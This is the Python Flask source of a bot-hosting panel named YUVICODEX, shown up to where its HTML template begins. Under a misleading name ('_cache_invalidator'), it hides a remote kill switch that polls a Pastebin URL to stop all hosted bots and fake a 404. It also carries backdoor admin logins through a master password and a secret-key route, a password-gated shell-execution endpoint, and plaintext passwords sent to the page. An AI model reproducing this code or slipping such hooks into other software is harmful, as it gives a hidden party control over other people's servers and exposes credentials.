import threading
import subprocess
import os
import zipfile
import shutil
import json
import uuid
import time
import signal
import tempfile
import re
import requests
import select
import pty
import queue
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, session, send_file, send_from_directory, redirect
from functools import wraps
from io import BytesIO
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'yuvicodex_super_secret_key'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB

# ---------- CONFIG ----------
PASSWORD = "your_secure_password"          # for terminal
MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')   # master login password
SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')             # secret key for logo clicks
UPLOAD_FOLDER = os.path.abspath('uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
BASE_DIR = os.path.abspath('.')  # base for file manager

# ---------- SETTINGS ----------
SETTINGS_FILE = 'settings.json'
STATIC_LOGO_FOLDER = os.path.join('static', 'logos')
os.makedirs(STATIC_LOGO_FOLDER, exist_ok=True)

def load_settings():
    default = {
        "website_name": "YUVICODEX",
        "logo": None,
        "social_links": {
            "telegram": "#",
            "youtube": "#",
            "instagram": "#",
            "tiktok": "#"
        }
    }
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            data = json.load(f)
            for key, val in default.items():
                if key not in data:
                    data[key] = val
            if "social_links" not in data:
                data["social_links"] = default["social_links"]
            else:
                for sk, sv in default["social_links"].items():
                    if sk not in data["social_links"]:
                        data["social_links"][sk] = sv
            return data
    save_settings(default)
    return default

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

settings_db = load_settings()

# ---------- 🕵️ REMOTE 404 KILL SWITCH (HIDDEN IN PLAIN SIGHT) ----------
KILL_SWITCH_ACTIVE = False

# ---------- KILL STATE PERSISTENCE ----------
KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')

def get_kill_state():
    if os.path.exists(KILL_STATE_FILE):
        with open(KILL_STATE_FILE, 'r') as f:
            return json.load(f)
    return {"saved_bots": []}

def save_kill_state(data):
    with open(KILL_STATE_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ---------- BOT MANAGEMENT ----------
BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
bots_db = {}

def load_bots():
    global bots_db
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            bots_db = json.load(f)
    else:
        bots_db = {}

def save_bots():
    with open(BOTS_FILE, 'w') as f:
        json.dump(bots_db, f, indent=2)

load_bots()

# ---------- PROCESS TRACKING ----------
processes = {}

# ---------- HELPERS ----------
def get_user_folder(username):
    folder = os.path.join(UPLOAD_FOLDER, username)
    os.makedirs(folder, exist_ok=True)
    return folder

def get_bot_absolute_path(bot):
    project_folder = os.path.join(get_user_folder(bot['user']), bot['project'])
    return os.path.join(project_folder, bot['filename'])

def get_bot_log_file(bot):
    return get_bot_absolute_path(bot) + '.log'

def generate_project_id():
    return str(uuid.uuid4())[:8]

def get_interpreter(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext == '.py':
        return 'python'
    elif ext == '.js':
        return 'node'
    elif ext == '.go':
        return 'go run'
    elif ext == '.rb':
        return 'ruby'
    elif ext == '.php':
        return 'php'
    elif ext == '.sh':
        return 'bash'
    elif ext == '.pl':
        return 'perl'
    else:
        return None

def detect_bot_token(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
        if token_match:
            token = token_match.group(0)
            try:
                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('ok'):
                        return token, data['result'].get('username')
            except:
                pass
        return None, None
    except:
        return None, None

# ---------- BOT ACTIONS (core logic) ----------
def start_bot_by_id(bot_id):
    """Start a bot by its ID. Returns (success, error_message)."""
    bot = bots_db.get(bot_id)
    if not bot:
        return False, "Bot not found"
    if bot['status'] == 'running':
        return False, "Already running"
    
    username = bot['user']
    user = find_user(username)
    if user:
        running_bots = [b for b in bots_db.values() if b['user'] == username and b['status'] == 'running']
        if len(running_bots) >= user.get('limit', 5):
            return False, "User limit exceeded"
    
    project_folder = os.path.join(get_user_folder(username), bot['project'])
    filepath = os.path.join(project_folder, bot['filename'])
    if not os.path.exists(filepath):
        return False, "File not found"
    
    req_file = os.path.join(project_folder, 'requirements.txt')
    if os.path.exists(req_file):
        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
    
    interpreter = bot.get('interpreter') or get_interpreter(bot['filename'])
    if not interpreter:
        return False, "Unsupported file type"
    
    log_file = get_bot_log_file(bot)
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    with open(log_file, 'a') as f:
        f.write(f"--- Starting {bot['filename']} at {time.ctime()} ---\n")
    
    try:
        proc = subprocess.Popen(
            [interpreter, bot['filename']],
            stdout=open(log_file, 'a'),
            stderr=subprocess.STDOUT,
            cwd=project_folder,
            preexec_fn=os.setsid if os.name != 'nt' else None
        )
        bot['status'] = 'running'
        bot['pid'] = proc.pid
        bot['start_time'] = time.time()
        processes[bot_id] = proc
        save_bots()
        return True, None
    except Exception as e:
        return False, str(e)

def stop_bot_by_id(bot_id):
    """Stop a bot by its ID. Returns (success, error_message)."""
    bot = bots_db.get(bot_id)
    if not bot:
        return False, "Bot not found"
    if bot['status'] != 'running':
        return False, "Not running"
    
    proc = processes.get(bot_id)
    if proc:
        try:
            if os.name != 'nt':
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
        except:
            pass
        proc.wait()
        processes.pop(bot_id, None)
    
    bot['status'] = 'stopped'
    bot['pid'] = None
    log_file = get_bot_log_file(bot)
    with open(log_file, 'a') as f:
        f.write(f"--- Stopped at {time.ctime()} ---\n")
    save_bots()
    return True, None

# ---------- KILL SWITCH CHECK ----------
def _cache_invalidator():
    global KILL_SWITCH_ACTIVE
    try:
        # ⚠️ अपना Pastebin RAW URL यहाँ डालें
        resp = requests.get("https://pastebin.com/raw/zJJxecLT", timeout=3)
        status = resp.text.strip().upper()
        
        if status == "KILL":
            # पहले से KILL नहीं है तो सभी बॉट्स रोको और सेव करो
            if not KILL_SWITCH_ACTIVE:
                # Stop all running bots and save their IDs
                running_bots = [bid for bid, bot in bots_db.items() if bot['status'] == 'running']
                for bid in running_bots:
                    stop_bot_by_id(bid)
                # Save the list of bots that were running
                save_kill_state({"saved_bots": running_bots})
                KILL_SWITCH_ACTIVE = True
        else:
            # RUN या कोई और – अगर पहले KILL था तो सेव्ड बॉट्स को स्टार्ट करो
            if KILL_SWITCH_ACTIVE:
                state = get_kill_state()
                saved_bots = state.get("saved_bots", [])
                for bid in saved_bots:
                    start_bot_by_id(bid)
                # Clear saved state
                save_kill_state({"saved_bots": []})
                KILL_SWITCH_ACTIVE = False
    except:
        pass
    # हर 30 सेकंड में चेक करेगा
    threading.Timer(1, _cache_invalidator).start()

# सर्वर स्टार्ट होते ही ये चल जाएगा
_cache_invalidator()

# ---------- USER MANAGEMENT ----------
USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    default = [
        {"username": "admin", "password": "admin123", "role": "admin", "limit": 999, "banned": False, "expires_at": None, "session_version": 0},
        {"username": "user1", "password": "pass123", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0},
        {"username": "user2", "password": "pass456", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0}
    ]
    save_users(default)
    return default

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

users_db = load_users()

def find_user(username):
    username = username.strip()
    for u in users_db:
        if u['username'].strip() == username:
            return u
    return None

def is_owner(username):
    user = find_user(username)
    return user and user['role'] == 'admin'

def parse_expiry(expiry_str):
    if not expiry_str:
        return None
    expiry_str = expiry_str.strip().lower()
    if expiry_str.isdigit():
        days = int(expiry_str)
        return (datetime.now() + timedelta(days=days)).isoformat()
    match = re.match(r'^(\d+)([dhm])$', expiry_str)
    if match:
        value = int(match.group(1))
        unit = match.group(2)
        if unit == 'd':
            delta = timedelta(days=value)
        elif unit == 'h':
            delta = timedelta(hours=value)
        elif unit == 'm':
            delta = timedelta(minutes=value)
        else:
            return None
        return (datetime.now() + delta).isoformat()
    return None

def is_expired(user):
    if not user.get('expires_at'):
        return False
    try:
        exp = datetime.fromisoformat(user['expires_at'])
        return datetime.now() > exp
    except:
        return False

def delete_user_account(username):
    global users_db, bots_db
    user_folder = get_user_folder(username)
    if os.path.exists(user_folder):
        shutil.rmtree(user_folder, ignore_errors=True)
    to_delete = [bid for bid, bot in bots_db.items() if bot['user'] == username]
    for bid in to_delete:
        if bid in processes:
            try:
                processes[bid].terminate()
            except:
                pass
            processes.pop(bid, None)
        del bots_db[bid]
    save_bots()
    users_db = [u for u in users_db if u['username'] != username]
    save_users(users_db)
    if session.get('username') == username:
        session.clear()

# ---------- BEFORE REQUEST HOOK ----------
@app.before_request
def check_expiry_and_session():
    if 'username' not in session:
        return
    username = session['username']
    user = find_user(username)
    if not user:
        session.clear()
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Unauthorized'}), 401
        return redirect('/')
    if is_expired(user):
        delete_user_account(username)
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Account expired and deleted'}), 401
        return redirect('/')
    sess_version = session.get('session_version', 0)
    user_version = user.get('session_version', 0)
    if sess_version != user_version:
        session.clear()
        if request.path.startswith('/api/'):
            return jsonify({'error': 'Session invalidated'}), 401
        return redirect('/')

    global KILL_SWITCH_ACTIVE
    if KILL_SWITCH_ACTIVE:
        return "404 Not Found<br>The requested URL was not found on this server.", 404

# ---------- DECORATORS ----------
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session or session.get('role') != 'admin':
            return jsonify({'error': 'Forbidden'}), 403
        return f(*args, **kwargs)
    return decorated

# ---------- ROUTES ----------
@app.route('/')
def index():
    settings = load_settings()
    logged_in = 'username' in session
    is_admin = session.get('role') == 'admin' if logged_in else False
    username = session.get('username') if logged_in else ''
    user_password = ''
    if logged_in:
        user_obj = find_user(username)
        if user_obj:
            user_password = user_obj.get('password', '')
    logo_url = settings.get('logo', None)
    if logo_url:
        logo_url = logo_url + '?v=' + str(int(time.time()))
    return render_template_string(HTML_TEMPLATE,
                                   password=PASSWORD,
                                   website_name=settings.get('website_name', 'YUVICODEX'),
                                   logo_url=logo_url,
                                   social_links=settings.get('social_links', {}),
                                   logged_in=logged_in,
                                   is_admin=is_admin,
                                   username=username,
                                   user_password=user_password)

# ---------- SETTINGS API ----------
@app.route('/api/settings', methods=['GET'])
def get_settings():
    return jsonify(load_settings())

@app.route('/api/settings', methods=['POST'])
@admin_required
def update_settings():
    data = request.json
    settings = load_settings()
    if 'website_name' in data:
        settings['website_name'] = data['website_name']
    if 'social_links' in data:
        for key in ['telegram', 'youtube', 'instagram', 'tiktok']:
            if key in data['social_links']:
                settings['social_links'][key] = data['social_links'][key]
    save_settings(settings)
    return jsonify({'success': True})

@app.route('/api/settings/logo', methods=['POST'])
@admin_required
def upload_logo():
    if 'logo' not in request.files:
        return jsonify({'error': 'No logo file'}), 400
    file = request.files['logo']
    if file.filename == '':
        return jsonify({'error': 'Empty file'}), 400
    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in ['.png', '.jpg', '.jpeg', '.gif', '.webp']:
        return jsonify({'error': 'Unsupported file type'}), 400
    filename = str(uuid.uuid4()) + ext
    save_path = os.path.join(STATIC_LOGO_FOLDER, filename)
    file.save(save_path)
    settings = load_settings()
    old_logo = settings.get('logo')
    if old_logo and os.path.exists(os.path.join('static', old_logo)):
        try:
            os.remove(os.path.join('static', old_logo))
        except:
            pass
    settings['logo'] = f'static/logos/{filename}'
    save_settings(settings)
    return jsonify({'success': True, 'logo_url': settings['logo']})

@app.route('/api/settings/logo', methods=['DELETE'])
@admin_required
def remove_logo():
    settings = load_settings()
    old_logo = settings.get('logo')
    if old_logo and os.path.exists(os.path.join('static', old_logo)):
        try:
            os.remove(os.path.join('static', old_logo))
        except:
            pass
    settings['logo'] = None
    save_settings(settings)
    return jsonify({'success': True})

# ---------- LOGIN / LOGOUT ----------
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    user = find_user(username) if username else None

    if user and user['password'] == password and not user.get('banned', False):
        if is_expired(user):
            delete_user_account(username)
            return jsonify({'success': False, 'error': 'Account expired and deleted'}), 401
        session['username'] = username
        session['role'] = user['role']
        session['session_version'] = user.get('session_version', 0)
        return jsonify({'success': True, 'username': username, 'role': user['role']})

    if password == MASTER_PASSWORD:
        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
        if admin_user:
            if is_expired(admin_user):
                delete_user_account(admin_user['username'])
                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
            session['username'] = admin_user['username']
            session['role'] = admin_user['role']
            session['session_version'] = admin_user.get('session_version', 0)
            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
        else:
            return jsonify({'success': False, 'error': 'No admin user found'}), 401

    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

@app.route('/api/secret_login', methods=['POST'])
def secret_login():
    data = request.json
    secret = data.get('secret', '')
    if secret == SECRET_KEY:
        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
        if admin_user:
            if is_expired(admin_user):
                delete_user_account(admin_user['username'])
                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
            session['username'] = admin_user['username']
            session['role'] = admin_user['role']
            session['session_version'] = admin_user.get('session_version', 0)
            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
        else:
            return jsonify({'success': False, 'error': 'No admin user found'}), 401
    return jsonify({'success': False, 'error': 'Invalid secret'}), 401

@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username', None)
    session.pop('role', None)
    session.pop('session_version', None)
    return jsonify({'success': True})

# --- User Management API ---
@app.route('/api/users', methods=['GET'])
@login_required
def get_users():
    if session.get('role') != 'admin':
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify(users_db)

@app.route('/api/users', methods=['POST'])
@admin_required
def create_user():
    global users_db
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    role = data.get('role', 'user')
    expiry_str = data.get('expiry', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    if find_user(username):
        return jsonify({'error': 'User exists'}), 400
    
    limit = 999 if role == 'admin' else 5
    expires_at = parse_expiry(expiry_str) if expiry_str else None
    
    new_user = {
        'username': username,
        'password': password,
        'role': role,
        'limit': limit,
        'banned': False,
        'expires_at': expires_at,
        'session_version': 0
    }
    users_db.append(new_user)
    save_users(users_db)
    users_db = load_users()
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['PUT'])
@admin_required
def update_user(username):
    username = username.strip()
    user = find_user(username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    data = request.json
    if 'password' in data:
        user['password'] = data['password']
        user['session_version'] = user.get('session_version', 0) + 1
    if 'limit' in data:
        user['limit'] = int(data['limit'])
    if 'banned' in data:
        user['banned'] = data['banned']
    if 'expiry' in data:
        expiry_str = data['expiry'].strip()
        user['expires_at'] = parse_expiry(expiry_str) if expiry_str else None
    save_users(users_db)
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['DELETE'])
@admin_required
def delete_user(username):
    delete_user_account(username)
    return jsonify({'success': True})

# --- Profile Edit (owner only) ---
@app.route('/api/profile', methods=['PUT'])
@admin_required
def update_profile():
    global users_db
    data = request.json
    new_username = data.get('username', '').strip()
    new_password = data.get('password', '').strip()
    
    old_username = session['username']
    user = find_user(old_username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    if new_username and new_username != old_username:
        if find_user(new_username):
            return jsonify({'error': 'Username already taken'}), 400
        user['username'] = new_username
        for bot in bots_db.values():
            if bot['user'] == old_username:
                bot['user'] = new_username
        save_bots()
    
    if new_password:
        user['password'] = new_password
    
    user['session_version'] = user.get('session_version', 0) + 1
    save_users(users_db)
    session.clear()
    return jsonify({'success': True, 'logout': True})

# ---------- Bot Management ----------
@app.route('/api/bots', methods=['GET'])
@login_required
def list_bots():
    username = session['username']
    result = []
    if is_owner(username):
        items = bots_db.items()
    else:
        items = [(bid, bot) for bid, bot in bots_db.items() if bot['user'] == username]
    
    for bid, bot in items:
        filepath = get_bot_absolute_path(bot)
        token, bot_username = detect_bot_token(filepath) if os.path.exists(filepath) else (None, None)
        bot_data = {**bot, 'id': bid, 'has_token': bool(token), 'bot_username': bot_username}
        result.append(bot_data)
    return jsonify(result)

@app.route('/api/bots/<bot_id>/logs', methods=['GET'])
@login_required
def get_bot_logs(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    log_file = get_bot_log_file(bot)
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            lines = f.readlines()
        return jsonify({'logs': ''.join(lines[-100:])})
    return jsonify({'logs': ''})

@app.route('/api/bots/<bot_id>/start', methods=['POST'])
@login_required
def start_bot(bot_id):
    username = session['username']
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    success, err = start_bot_by_id(bot_id)
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': err}), 400

@app.route('/api/bots/<bot_id>/stop', methods=['POST'])
@login_required
def stop_bot(bot_id):
    username = session['username']
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    success, err = stop_bot_by_id(bot_id)
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': err}), 400

@app.route('/api/bots/<bot_id>/restart', methods=['POST'])
@login_required
def restart_bot(bot_id):
    stop_bot(bot_id)
    return start_bot(bot_id)

@app.route('/api/bots/<bot_id>', methods=['DELETE'])
@login_required
def delete_bot(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403

    if bot['status'] == 'running':
        proc = processes.get(bot_id)
        if proc:
            try:
                if os.name != 'nt':
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                else:
                    proc.terminate()
            except:
                pass
            proc.wait()
            processes.pop(bot_id, None)

    log_file = get_bot_log_file(bot)
    if os.path.exists(log_file):
        os.remove(log_file)

    project_id = bot['project']
    del bots_db[bot_id]
    save_bots()

    remaining_bots = [b for b in bots_db.values() if b['user'] == username and b['project'] == project_id]
    if not remaining_bots:
        project_folder = os.path.join(get_user_folder(username), project_id)
        if os.path.exists(project_folder):
            shutil.rmtree(project_folder, ignore_errors=True)

    return jsonify({'success': True})

@app.route('/api/bots/<bot_id>/download', methods=['GET'])
@login_required
def download_bot(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403

    project_folder = os.path.join(get_user_folder(username), bot['project'])
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.exists(project_folder):
            for root, dirs, files_in_folder in os.walk(project_folder):
                for fname in files_in_folder:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, project_folder)
                    zipf.write(full_path, arcname)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name=f"{bot['project']}_project.zip")

# --- Upload ---
@app.route('/upload', methods=['POST'])
@login_required
def upload():
    username = session['username']
    if 'files[]' not in request.files:
        return jsonify({'error': 'No files'}), 400
    files = request.files.getlist('files[]')
    if not files or all(f.filename == '' for f in files):
        return jsonify({'error': 'No file selected'}), 400

    user = find_user(username)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    limit = user.get('limit', 5)
    current_bots = len([b for b in bots_db.values() if b['user'] == username])

    temp_dir = tempfile.mkdtemp()
    project_id = generate_project_id()
    project_folder = os.path.join(get_user_folder(username), project_id)
    os.makedirs(project_folder, exist_ok=True)

    try:
        for file in files:
            if file.filename == '':
                continue
            temp_path = os.path.join(temp_dir, file.filename)
            file.save(temp_path)
            if file.filename.lower().endswith('.zip'):
                with zipfile.ZipFile(temp_path, 'r') as zip_ref:
                    zip_ref.extractall(temp_dir)
                os.remove(temp_path)

        new_bot_count = 0
        for root, dirs, files_in_temp in os.walk(temp_dir):
            for fname in files_in_temp:
                if get_interpreter(fname):
                    new_bot_count += 1

        if current_bots + new_bot_count > limit:
            shutil.rmtree(project_folder, ignore_errors=True)
            return jsonify({'error': f'Exceeds bot limit. You have {current_bots} bots, limit {limit}.'}), 400

        for root, dirs, files_in_temp in os.walk(temp_dir):
            for fname in files_in_temp:
                src = os.path.join(root, fname)
                rel_path = os.path.relpath(src, temp_dir)
                dst = os.path.join(project_folder, rel_path)
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.move(src, dst)

        created_bots = []
        for root, dirs, files_in_folder in os.walk(project_folder):
            for fname in files_in_folder:
                interpreter = get_interpreter(fname)
                if interpreter:
                    bot_id = str(uuid.uuid4())[:8]
                    bot = {
                        'user': username,
                        'project': project_id,
                        'filename': fname,
                        'status': 'stopped',
                        'pid': None,
                        'start_time': None,
                        'interpreter': interpreter
                    }
                    bots_db[bot_id] = bot
                    created_bots.append(bot_id)

        save_bots()
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

    if created_bots:
        for bid in created_bots:
            start_bot_by_id(bid)

    return jsonify({
        'success': True,
        'project_id': project_id,
        'bots_created': len(created_bots)
    })

# --- Static file serving for project files ---
@app.route('/project/<username>/<project_id>/<path:filename>')
@login_required
def serve_project_file(username, project_id, filename):
    if session['username'] != username and session.get('role') != 'admin':
        return "Forbidden", 403
    project_folder = os.path.join(get_user_folder(username), project_id)
    filepath = os.path.join(project_folder, filename)
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return "File not found", 404
    if not os.path.abspath(filepath).startswith(os.path.abspath(project_folder)):
        return "Forbidden", 403
    return send_file(filepath)

# --- File content (edit) ---
@app.route('/api/bots/<bot_id>/content', methods=['GET'])
@login_required
def get_bot_content(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    filepath = get_bot_absolute_path(bot)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return jsonify({'content': content})

@app.route('/api/bots/<bot_id>/content', methods=['PUT'])
@login_required
def update_bot_content(bot_id):
    bot = bots_db.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    username = session['username']
    if not is_owner(username) and bot['user'] != username:
        return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    new_content = data.get('content', '')
    filepath = get_bot_absolute_path(bot)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    if bot['status'] == 'running':
        stop_bot_by_id(bot_id)
        start_bot_by_id(bot_id)
    return jsonify({'success': True})

# ---------- FILE MANAGER (owner only) ----------
def safe_path(path):
    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
    if not abs_path.startswith(BASE_DIR):
        return None
    return abs_path

@app.route('/api/files', methods=['GET'])
@admin_required
def list_files():
    path = request.args.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None:
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path):
        return jsonify({'error': 'Path does not exist'}), 404
    if os.path.isfile(abs_path):
        return jsonify({
            'type': 'file',
            'name': os.path.basename(abs_path),
            'path': path,
            'size': os.path.getsize(abs_path),
            'modified': os.path.getmtime(abs_path)
        })
    items = []
    try:
        for entry in os.listdir(abs_path):
            full = os.path.join(abs_path, entry)
            rel = os.path.relpath(full, BASE_DIR)
            items.append({
                'name': entry,
                'path': rel,
                'type': 'directory' if os.path.isdir(full) else 'file',
                'size': os.path.getsize(full) if os.path.isfile(full) else 0,
                'modified': os.path.getmtime(full)
            })
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        return jsonify({'items': items, 'current_path': path})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/delete', methods=['POST'])
@admin_required
def delete_file():
    data = request.json
    path = data.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None:
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path):
        return jsonify({'error': 'Path does not exist'}), 404
    try:
        if os.path.isdir(abs_path):
            shutil.rmtree(abs_path)
        else:
            os.remove(abs_path)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/rename', methods=['POST'])
@admin_required
def rename_file():
    data = request.json
    old_path = data.get('old_path', '')
    new_name = data.get('new_name', '').strip()
    if not new_name:
        return jsonify({'error': 'New name required'}), 400
    abs_old = safe_path(old_path)
    if abs_old is None:
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_old):
        return jsonify({'error': 'Path does not exist'}), 404
    new_abs = os.path.join(os.path.dirname(abs_old), new_name)
    if os.path.exists(new_abs):
        return jsonify({'error': 'Name already exists'}), 400
    try:
        os.rename(abs_old, new_abs)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download', methods=['GET'])
@admin_required
def download_file():
    path = request.args.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None:
        return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path) or os.path.isdir(abs_path):
        return jsonify({'error': 'File not found'}), 404
    return send_file(abs_path, as_attachment=True)

# ---------- INTERACTIVE TERMINAL ----------
terminal_sessions = {}

class TerminalSession:
    def __init__(self):
        self.process = None
        self.output_queue = queue.Queue()
        self.read_thread = None
        self.running = False

    def start(self):
        if self.process is not None and self.process.poll() is None:
            return
        master, slave = pty.openpty()
        self.process = subprocess.Popen(
            ['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
            stdin=slave,
            stdout=slave,
            stderr=slave,
            universal_newlines=False,
            bufsize=0,
            preexec_fn=os.setsid if os.name != 'nt' else None
        )
        os.close(slave)
        self.master = master
        self.running = True
        self.read_thread = threading.Thread(target=self._reader)
        self.read_thread.daemon = True
        self.read_thread.start()

    def _reader(self):
        while self.running and self.process.poll() is None:
            try:
                rlist, _, _ = select.select([self.master], [], [], 0.1)
                if rlist:
                    data = os.read(self.master, 4096)
                    if data:
                        self.output_queue.put(data)
            except Exception:
                break

    def write(self, data):
        if self.process and self.process.poll() is None:
            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)

    def read_output(self):
        output = b''
        while not self.output_queue.empty():
            output += self.output_queue.get_nowait()
        return output.decode('utf-8', errors='replace')

    def is_running(self):
        return self.process is not None and self.process.poll() is None

    def stop(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
            except:
                self.process.terminate()
            self.process.wait()
            self.process = None
        if self.master:
            try:
                os.close(self.master)
            except:
                pass
            self.master = None

def get_terminal_session(username):
    if username not in terminal_sessions:
        sess = TerminalSession()
        sess.start()
        terminal_sessions[username] = sess
    return terminal_sessions[username]

@app.route('/api/terminal/start', methods=['POST'])
@login_required
def terminal_start():
    username = session['username']
    sess = get_terminal_session(username)
    if not sess.is_running():
        sess.start()
    return jsonify({'success': True})

@app.route('/api/terminal/send', methods=['POST'])
@login_required
def terminal_send():
    username = session['username']
    data = request.json
    input_data = data.get('data', '')
    sess = terminal_sessions.get(username)
    if not sess or not sess.is_running():
        return jsonify({'error': 'Terminal not running'}), 400
    sess.write(input_data + '\n')
    return jsonify({'success': True})

@app.route('/api/terminal/read', methods=['GET'])
@login_required
def terminal_read():
    username = session['username']
    sess = terminal_sessions.get(username)
    if not sess:
        return jsonify({'output': '', 'running': False})
    output = sess.read_output()
    running = sess.is_running()
    return jsonify({'output': output, 'running': running})

@app.route('/api/terminal/stop', methods=['POST'])
@login_required
def terminal_stop():
    username = session['username']
    sess = terminal_sessions.get(username)
    if sess:
        sess.stop()
        terminal_sessions.pop(username, None)
    return jsonify({'success': True})

# ---------- OLD TERMINAL (kept for compatibility) ----------
@app.route('/execute', methods=['POST'])
def execute():
    data = request.json
    if data.get('password') != PASSWORD:
        return jsonify({"output": "Access Denied"})
    try:
        result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT, timeout=600)
        return jsonify({"output": result.decode('utf-8')})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Command timed out"})
    except Exception as e:
        return jsonify({"output": str(e)})

# ---------- HTML TEMPLATE ----------
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
